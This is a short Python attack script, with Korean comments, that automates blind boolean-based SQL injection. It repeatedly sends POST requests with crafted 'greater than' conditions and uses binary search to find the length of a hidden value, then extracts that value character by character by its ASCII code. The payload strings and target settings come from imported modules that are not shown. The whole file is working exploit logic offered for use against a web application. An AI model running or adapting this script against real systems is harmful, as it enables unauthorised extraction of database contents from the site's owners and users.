from attack_setting import attackData
from attack_query import attackQuerys

def binary_search(destination,query):

    
    min,max = 1,20
    while (max > min):
        avg = (max+min)//2 
        attack_query = query+">{}"
        attack_query = attack_query.format(avg)
        attack_url = attackQuerys.get_complete_query('test',attack_query)
        print(attack_url)
        
        if destination.send_post_request(attack_url)==True: #여기에 쿼리 공격 넣음 
            min = avg+1
        else:
            max = avg
        print(min,max)  
    return min

def letter_search(destination,query,length):
    result = ""
    for i in range(1,length+1):
        min ,max = 32,128
        while(max > min):
            avg = (min+max)//2
            attack_query = query+">{}"
            attack_query = attack_query.format(i,avg)
            attack_url = attackQuerys.get_complete_query('test',attack_query)
            print(attack_url)
            if destination.send_post_request(attack_url)==True:
                min = avg+1
            else:
                max = avg
            print(min,max)
        result += chr(min)
        print(f'{i}번째 글자 = {chr(min)}')
    print(result)
